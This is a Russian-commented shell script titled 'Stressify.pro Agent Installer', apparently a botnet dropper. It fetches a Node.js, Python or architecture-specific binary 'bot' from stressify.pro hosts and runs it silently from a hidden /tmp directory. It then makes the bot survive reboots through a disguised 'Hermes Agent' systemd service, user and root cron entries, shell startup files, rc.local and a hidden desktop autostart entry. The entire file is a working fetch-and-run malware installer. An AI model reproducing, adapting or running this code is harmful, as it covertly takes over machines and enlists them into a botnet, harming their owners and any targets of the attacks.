#!/bin/sh
# install.sh - автоопределение архитектуры, запуск бота и автозагрузка

# ========== НАСТРОЙКИ ==========
CDN_URL="https://stat.stressify.pro/cross"
NODE_URL="https://stressify.pro/bot.js"
PYTHON_URL="https://stat.stressify.pro/cross/bot.py"
PERSIST_DIR="/tmp/.cache/.x"
LOG_FILE="/dev/null"
# ================================

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /

# Функция для очистки следов
cleanup() {
    rm -f "$BIN" 2>/dev/null
    rm -f "$PERSIST_DIR/bot.js" 2>/dev/null
    rm -f "$PERSIST_DIR/bot.py" 2>/dev/null
}

# Проверяем наличие интерпретаторов
has_node() {
    command -v node >/dev/null 2>&1 || [ -f /usr/bin/node ] || [ -f /usr/local/bin/node ]
}

has_python3() {
    command -v python3 >/dev/null 2>&1 || [ -f /usr/bin/python3 ] || [ -f /usr/local/bin/python3 ]
}

has_crontab() {
    command -v crontab >/dev/null 2>&1
}

has_systemctl() {
    command -v systemctl >/dev/null 2>&1 && systemctl --user list >/dev/null 2>&1
}

# ========== ФУНКЦИЯ АВТОЗАГРУЗКИ ==========
setup_persistence() {
    local cmd="$1"
    local method=""
    
    echo "[*] Setting up persistence..."
    
    # СОЗДАЁМ ОБЁРТКУ, которая проверяет наличие bot файла
    local wrapper_script="$PERSIST_DIR/run_bot.sh"
    mkdir -p "$PERSIST_DIR" 2>/dev/null
    
    # Определяем какой бот используется
    local bot_type="node"
    if echo "$cmd" | grep -q "python3"; then
        bot_type="python"
    elif echo "$cmd" | grep -q "bot.py"; then
        bot_type="python"
    fi
    
    cat > "$wrapper_script" << 'EOF'
#!/bin/sh
# Wrapper script for bot with auto-download

PERSIST_DIR="/tmp/.cache/.x"
NODE_URL="https://stressify.pro/bot.js"
PYTHON_URL="https://stat.stressify.pro/cross/bot.py"
LOG_FILE="/dev/null"

# Проверяем наличие Node.js
has_node() {
    command -v node >/dev/null 2>&1 || [ -f /usr/bin/node ] || [ -f /usr/local/bin/node ]
}

# Проверяем наличие Python3
has_python3() {
    command -v python3 >/dev/null 2>&1 || [ -f /usr/bin/python3 ] || [ -f /usr/local/bin/python3 ]
}

# Определяем какой бот использовать
if has_node; then
    BOT_FILE="$PERSIST_DIR/bot.js"
    BOT_URL="$NODE_URL"
    BOT_RUN="node"
elif has_python3; then
    BOT_FILE="$PERSIST_DIR/bot.py"
    BOT_URL="$PYTHON_URL"
    BOT_RUN="python3"
else
    # Если ничего нет, пробуем бинарник
    if [ -f "$PERSIST_DIR/bot.x86_64" ]; then
        exec "$PERSIST_DIR/bot.x86_64" >> "$LOG_FILE" 2>&1
    elif [ -f "$PERSIST_DIR/bot.aarch64" ]; then
        exec "$PERSIST_DIR/bot.aarch64" >> "$LOG_FILE" 2>&1
    else
        exit 1
    fi
fi

# Проверяем наличие бота, если нет - скачиваем
if [ ! -f "$BOT_FILE" ] || [ ! -s "$BOT_FILE" ]; then
    echo "[*] Bot not found, downloading..." > "$LOG_FILE"
    wget -q "$BOT_URL" -O "$BOT_FILE" 2>/dev/null
    curl -s "$BOT_URL" -o "$BOT_FILE" 2>/dev/null
    chmod +x "$BOT_FILE" 2>/dev/null
fi

# Запускаем бота
if [ -f "$BOT_FILE" ] && [ -s "$BOT_FILE" ]; then
    cd "$PERSIST_DIR"
    exec $BOT_RUN "$BOT_FILE" >> "$LOG_FILE" 2>&1
fi
EOF
    
    chmod +x "$wrapper_script" 2>/dev/null
    
    # Метод 1: systemd user service (самый надёжный)
    if has_systemctl; then
        mkdir -p ~/.config/systemd/user 2>/dev/null
        
        cat > ~/.config/systemd/user/hermes-agent.service << EOF
[Unit]
Description=Hermes Agent Service
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
WorkingDirectory=$PERSIST_DIR
ExecStart=$wrapper_script
Restart=always
RestartSec=30
StandardOutput=append:$LOG_FILE
StandardError=append:$LOG_FILE
NoNewPrivileges=no
RestrictRealtime=no
MemoryMax=256M
CPUQuota=50%

[Install]
WantedBy=default.target
EOF
        
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable hermes-agent.service 2>/dev/null
        systemctl --user start hermes-agent.service 2>/dev/null
        
        # Включаем linger чтобы сервис работал без логина
        if command -v loginctl >/dev/null 2>&1; then
            loginctl enable-linger 2>/dev/null
        fi
        
        method="systemd-user"
        echo "[+] systemd user service installed"
    fi
    
    # Метод 2: crontab @reboot
    if has_crontab; then
        local escaped_cmd=$(echo "$wrapper_script" | sed 's/"/\\"/g')
        (crontab -l 2>/dev/null | grep -v "hermes\|stressify\|bot.js\|bot.py\|bot.x86\|bot.aarch\|bot.arm\|run_bot" | crontab - 2>/dev/null; echo "@reboot $wrapper_script") | crontab - 2>/dev/null
        
        # Резервный вариант с sleep
        (crontab -l 2>/dev/null | grep -v "hermes.*sleep\|stressify.*sleep\|run_bot.*sleep"; echo "@reboot sleep 60 && $wrapper_script") | crontab - 2>/dev/null
        
        method="${method},crontab"
        echo "[+] crontab @reboot installed"
    fi
    
    # Метод 3: /etc/cron.d (если есть доступ)
    if [ -w /etc/cron.d ] || [ -w /etc/crontab ]; then
        if [ -d /etc/cron.d ]; then
            echo "*/10 * * * * root $wrapper_script" > /etc/cron.d/hermes-cron 2>/dev/null
            chmod 644 /etc/cron.d/hermes-cron 2>/dev/null
        elif [ -w /etc/crontab ]; then
            grep -v "hermes\|stressify\|bot.js\|bot.py\|run_bot" /etc/crontab > /tmp/ct 2>/dev/null
            echo "*/10 * * * * root $wrapper_script" >> /tmp/ct 2>/dev/null
            mv /tmp/ct /etc/crontab 2>/dev/null
        fi
        method="${method},/etc/cron.d"
        echo "[+] system crontab installed"
    fi
    
    # Метод 4: ~/.bashrc и ~/.profile
    local profile_cmd="($wrapper_script) >/dev/null 2>&1 &"
    for f in ~/.bashrc ~/.profile ~/.bash_profile ~/.zshrc; do
        if [ -f "$f" ] && [ -w "$f" ]; then
            grep -v "hermes\|stressify\|bot.js\|bot.py\|run_bot" "$f" > "${f}.tmp" 2>/dev/null
            echo "$profile_cmd" >> "${f}.tmp" 2>/dev/null
            mv "${f}.tmp" "$f" 2>/dev/null
        fi
    done
    
    # Метод 5: rc.local
    if [ -f /etc/rc.local ] && [ -w /etc/rc.local ]; then
        grep -v "hermes\|stressify\|bot.js\|bot.py\|run_bot" /etc/rc.local > /tmp/rcl 2>/dev/null
        sed -i "s|exit 0|$wrapper_script \&\nexit 0|" /tmp/rcl 2>/dev/null
        echo "$wrapper_script &" >> /tmp/rcl 2>/dev/null
        mv /tmp/rcl /etc/rc.local 2>/dev/null
        chmod +x /etc/rc.local 2>/dev/null
        method="${method},rc.local"
        echo "[+] rc.local installed"
    fi
    
    # Метод 6: ~/.config/autostart (если есть DE)
    if [ -d ~/.config/autostart ] || mkdir -p ~/.config/autostart 2>/dev/null; then
        cat > ~/.config/autostart/hermes.desktop << EOF
[Desktop Entry]
Type=Application
Name=Hermes Agent
Exec=$wrapper_script
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
        method="${method},autostart"
        echo "[+] .config/autostart installed"
    fi
    
    echo "[*] Persistence methods used: $method"
}

# ========== ЗАПУСК NODE.JS БОТА ==========
start_node_bot() {
    echo "[*] Node.js detected, using JavaScript bot..."
    
    # Создаём рабочую директорию
    mkdir -p "$PERSIST_DIR" 2>/dev/null
    
    # Проверяем наличие bot.js, если нет - скачиваем
    if [ ! -f "$PERSIST_DIR/bot.js" ] || [ ! -s "$PERSIST_DIR/bot.js" ]; then
        echo "[*] bot.js not found, downloading from $NODE_URL..."
        wget -q "$NODE_URL" -O "$PERSIST_DIR/bot.js" 2>/dev/null
        curl -s "$NODE_URL" -o "$PERSIST_DIR/bot.js" 2>/dev/null
    fi
    
    if [ -f "$PERSIST_DIR/bot.js" ] && [ -s "$PERSIST_DIR/bot.js" ]; then
        chmod +x "$PERSIST_DIR/bot.js" 2>/dev/null
        
        # Запускаем бота в фоне
        echo "[*] Starting bot.js..."
        cd "$PERSIST_DIR"
        NODE_BIN=$(command -v node 2>/dev/null || echo "/usr/bin/node")
        nohup $NODE_BIN "$PERSIST_DIR/bot.js" > "$LOG_FILE" 2>&1 &
        BOT_PID=$!
        echo "[+] bot.js started (PID: $BOT_PID)"
        
        # Настраиваем автозагрузку
        setup_persistence "$NODE_BIN $PERSIST_DIR/bot.js"
        
        return 0
    else
        echo "[-] Failed to download bot.js"
        return 1
    fi
}

# ========== ЗАПУСК PYTHON БОТА ==========
start_python_bot() {
    echo "[*] Python3 detected, using Python bot..."
    
    # Создаём рабочую директорию
    mkdir -p "$PERSIST_DIR" 2>/dev/null
    
    # Проверяем наличие bot.py, если нет - скачиваем
    if [ ! -f "$PERSIST_DIR/bot.py" ] || [ ! -s "$PERSIST_DIR/bot.py" ]; then
        echo "[*] bot.py not found, downloading from $PYTHON_URL..."
        wget -q "$PYTHON_URL" -O "$PERSIST_DIR/bot.py" 2>/dev/null
        curl -s "$PYTHON_URL" -o "$PERSIST_DIR/bot.py" 2>/dev/null
    fi
    
    if [ -f "$PERSIST_DIR/bot.py" ] && [ -s "$PERSIST_DIR/bot.py" ]; then
        chmod +x "$PERSIST_DIR/bot.py" 2>/dev/null
        
        # Запускаем бота в фоне
        echo "[*] Starting bot.py..."
        cd "$PERSIST_DIR"
        PYTHON_BIN=$(command -v python3 2>/dev/null || echo "/usr/bin/python3")
        nohup $PYTHON_BIN "$PERSIST_DIR/bot.py" > "$LOG_FILE" 2>&1 &
        BOT_PID=$!
        echo "[+] bot.py started (PID: $BOT_PID)"
        
        # Настраиваем автозагрузку
        setup_persistence "$PYTHON_BIN $PERSIST_DIR/bot.py"
        
        return 0
    else
        echo "[-] Failed to download bot.py"
        return 1
    fi
}

# ========== ЗАПУСК БИНАРНОГО БОТА ==========
start_binary_bot() {
    # Определяем архитектуру
    ARCH=$(uname -m)
    case $ARCH in
        x86_64|amd64)
            BIN="bot.x86_64"
            ;;
        aarch64|arm64)
            BIN="bot.aarch64"
            ;;
        armv7l|armv8l)
            BIN="bot.armv7"
            ;;
        armv6l)
            BIN="bot.armv6"
            ;;
        armv5l)
            BIN="bot.armv5"
            ;;
        armv4l)
            BIN="bot.armv4"
            ;;
        ppc64le)
            BIN="bot.ppc64le"
            ;;
        mips64|mips64el)
            BIN="bot.mips64"
            ;;
        mips|mipsel)
            BIN="bot.mips"
            ;;
        *)
            echo "[-] Unknown architecture: $ARCH"
            return 1
            ;;
    esac
    
    echo "[*] Architecture: $ARCH -> $BIN"
    
    # Скачиваем бинарник
    URL="$CDN_URL/$BIN"
    echo "[*] Downloading $BIN from $URL..."
    
    wget -q "$URL" -O "$BIN" 2>/dev/null
    curl -s "$URL" -o "$BIN" 2>/dev/null
    
    if [ $? -eq 0 ] && [ -f "$BIN" ] && [ -s "$BIN" ]; then
        chmod +x "$BIN"
        echo "[+] Downloaded $BIN ($(wc -c < $BIN) bytes)"
        
        # Запускаем бинарник
        echo "[*] Running $BIN..."
        nohup ./"$BIN" > "$LOG_FILE" 2>&1 &
        BOT_PID=$!
        echo "[+] Bot started (PID: $BOT_PID)"
        
        # Копируем в persist директорию
        mkdir -p "$PERSIST_DIR" 2>/dev/null
        cp "$BIN" "$PERSIST_DIR/$BIN" 2>/dev/null
        chmod +x "$PERSIST_DIR/$BIN" 2>/dev/null
        
        # Настраиваем автозагрузку
        setup_persistence "$PERSIST_DIR/$BIN"
        
        return 0
    else
        echo "[-] Failed to download $BIN"
        return 1
    fi
}

# ========== ОСНОВНАЯ ЛОГИКА ==========
echo "╔═══════════════════════════════════════╗"
echo "║  Stressify.pro Agent Installer v2.1  ║"
echo "╚═══════════════════════════════════════╝"
echo "[*] UID: $(id -u) | User: $(whoami) | Host: $(hostname)"
echo "[*] OS: $(uname -s) | Arch: $(uname -m)"
echo ""

SUCCESS=0

# Приоритет: Node.js -> Python3 -> бинарный бот
if has_node; then
    NODE_VERSION=$(node -v 2>/dev/null || nodejs -v 2>/dev/null || echo "unknown")
    echo "[*] Node.js found: $NODE_VERSION"
    start_node_bot && SUCCESS=1
elif has_python3; then
    PYTHON_VERSION=$(python3 -V 2>/dev/null | cut -d' ' -f2 || echo "unknown")
    echo "[*] Python3 found: $PYTHON_VERSION"
    start_python_bot && SUCCESS=1
else
    echo "[*] No interpreter found, falling back to binary bot..."
    start_binary_bot && SUCCESS=1
fi

if [ $SUCCESS -eq 1 ]; then
    echo ""
    echo "╔═══════════════════════════════════════╗"
    echo "║  Installation Complete!              ║"
    echo "║  Bot is running and will persist     ║"
    echo "║  after reboot.                       ║"
    echo "╚═══════════════════════════════════════╝"
    
    # Проверяем что процесс запущен
    sleep 2
    if ps aux 2>/dev/null | grep -v grep | grep -q "bot\."; then
        echo "[+] Bot process confirmed running"
    fi
    
    # Самоуничтожение скрипта (опционально)
    # rm -f "$0" 2>/dev/null
else
    echo ""
    echo "[-] Installation FAILED!"
    echo "[-] Tried all available methods"
fi

exit 0